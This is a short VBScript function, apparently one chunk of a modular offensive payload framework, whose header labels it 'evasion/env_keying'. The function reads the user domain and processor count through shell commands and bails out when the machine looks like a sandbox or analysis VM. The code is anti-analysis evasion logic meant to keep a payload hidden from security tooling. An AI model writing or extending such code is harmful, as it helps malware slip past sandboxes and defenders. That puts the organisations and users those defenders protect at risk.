' chunk: evasion/env_keying
' depends: core/run_cmd
' provides: check_environment
' format: vbscript

Function check_environment()
    check_environment = False
    Dim domain, cpus
    domain = Trim(_run("echo %USERDOMAIN%"))
    If domain = "%USERDOMAIN%" Then Exit Function
    If Len(domain) < 3 Then Exit Function
    cpus = Trim(_run("echo %NUMBER_OF_PROCESSORS%"))
    If CInt(cpus) < 2 Then Exit Function
    check_environment = True
End Function
